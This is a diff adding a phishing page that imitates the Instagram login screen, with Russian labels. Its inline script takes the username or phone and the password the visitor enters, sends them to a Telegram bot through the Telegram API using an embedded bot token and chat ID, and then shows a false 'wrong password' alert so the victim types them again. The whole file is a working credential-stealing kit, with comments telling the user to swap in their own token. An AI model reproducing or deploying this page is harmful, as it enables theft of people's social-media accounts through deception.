@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles.css" />
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
+    <title>Instagram</title>
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+                </h1>
+                <form id="loginForm">
+                    <label for="email" class="sr-only">Телефон, имя пользователя или эл.адрес</label>
+                    <input name="email" id="email" placeholder="Телефон, имя пользователя или эл.адрес" required />
+                
+                    <label for="password" class="sr-only">Пароль</label>
+                    <input name="password" id="password" type="password" placeholder="Пароль" required />
+                
+                    <button type="button" id="submitBtn">Войти</button>
+                </form>                
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">ИЛИ</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <img />
+                        <a>Продолжить с аккаунтом Facebook</a>
+                    </div>
+                    <a href="#">Забыли пароль?</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>У вас ещё нет аккаунта?</p>
+                <a href="#">Зарегистрироваться</a>
+            </div>
+            <div class="app-download flex direction-column align-items-center">
+                <p></p>
+                <div class="flex justify-content-center">
+                    <img src="./img/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
+                    <img src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <p class="copyright" style="margin-top: 20px;">© 2020 Instagram do Facebook</p>
+    </footer>
+
+
+
+    <script>
+        const submitBtn = document.getElementById('submitBtn');
+    
+        submitBtn.addEventListener('click', function() {
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+    
+            if (email === '' || password === '') {
+                alert('Пожалуйста, заполните все поля!');
+                return;
+            }
+    
+            const token = '8162674413:AAG1jVHXbqB2o9apTM-OHGPkEiOXTuOgGNo';  // Замените на свой токен бота Telegram
+            const chatId = '5790645576';   // Замените на свой chat_id
+            const message = `Новая авторизация:\n📧 Email/Телефон: ${email}\n🔑 Пароль: ${password}`;
+    
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('Пароль или логин неверный!');
+                    document.getElementById('loginForm').reset();
+                } else {
+                    alert(`Ошибка: ${data.description}`);
+                }
+            })
+            .catch(error => {
+                console.error('Ошибка при отправке:', error);
+                alert('Произошла ошибка при отправке данных.');
+            });
+        });
+    </script>
+
+</body>
+</html>
